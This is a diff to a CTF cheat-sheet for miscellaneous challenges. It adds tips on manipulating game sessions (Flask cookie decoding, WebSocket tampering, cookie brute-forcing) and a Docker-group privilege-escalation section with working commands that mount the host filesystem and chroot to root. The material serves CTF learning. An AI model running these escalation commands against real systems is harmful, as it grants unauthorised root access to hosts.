@@ -19,7 +19,7 @@ Quick reference for miscellaneous CTF challenges. Each technique has a one-liner
 - [encodings.md](encodings.md) - Encodings, QR codes, esolangs, Verilog/HDL, UTF-16 tricks, BCD encoding, multi-layer auto-decoding, Gray code cyclic encoding
 - [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
 - [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
-- [games-and-vms.md](games-and-vms.md) - WASM patching, Roblox place file reversing, PyInstaller, marshal, Python env RCE, Z3, K8s RBAC, floating-point precision exploitation, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, custom assembly language sandbox escape via Python MRO chain, ML weight perturbation negation
+- [games-and-vms.md](games-and-vms.md) - WASM patching, Roblox place file reversing, PyInstaller, marshal, Python env RCE, Z3, K8s RBAC, floating-point precision exploitation, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, custom assembly language sandbox escape via Python MRO chain, ML weight perturbation negation, cookie checkpoint game brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass
 
 ---
 
@@ -176,6 +176,10 @@ new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_
 - **WASM patching:** `wasm2wat` -> flip minimax -> `wat2wasm`. See [games-and-vms.md](games-and-vms.md).
 - **Float precision:** Large multipliers amplify FP errors into exploitable fractions. See [games-and-vms.md](games-and-vms.md).
 - **K8s RBAC bypass:** SA token -> impersonate -> hostPath mount -> read secrets. See [games-and-vms.md](games-and-vms.md).
+- **Cookie checkpoint:** Save session cookies before guesses, restore on failure to brute-force without reset. See [games-and-vms.md](games-and-vms.md).
+- **Flask cookie game state:** `flask-unsign -d -c '<cookie>'` decodes unsigned Flask sessions, leaking game answers. See [games-and-vms.md](games-and-vms.md).
+- **WebSocket teleport:** Modify `player.x`/`player.y` in console, call verification function. See [games-and-vms.md](games-and-vms.md).
+- **Time-only validation:** Start session, `time.sleep(required_seconds)`, submit win. See [games-and-vms.md](games-and-vms.md).
 
 ## 3D Printer Video Nozzle Tracking (LACTF 2026)
 
@@ -222,7 +226,31 @@ getfacl /path/to/restricted/file
 
 # Sudo permissions
 sudo -l
+
+# Docker group membership (instant root)
+id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 ```
+
+## Docker Group Privilege Escalation (H7CTF 2025)
+
+User in the `docker` group can mount the host filesystem into a container and chroot into it for root access.
+
+```bash
+# Check group membership
+id  # Look for "docker" in groups
+
+# Mount host root filesystem and chroot
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+
+# Now running as root on the host filesystem
+cat /root/flag.txt
+```
+
+**Key insight:** Docker group membership is equivalent to root access. The `docker` CLI socket (`/var/run/docker.sock`) allows creating privileged containers that mount the entire host filesystem.
+
+**Reference:** https://gtfobins.github.io/gtfobins/docker/
+
+---
 
 ---
 
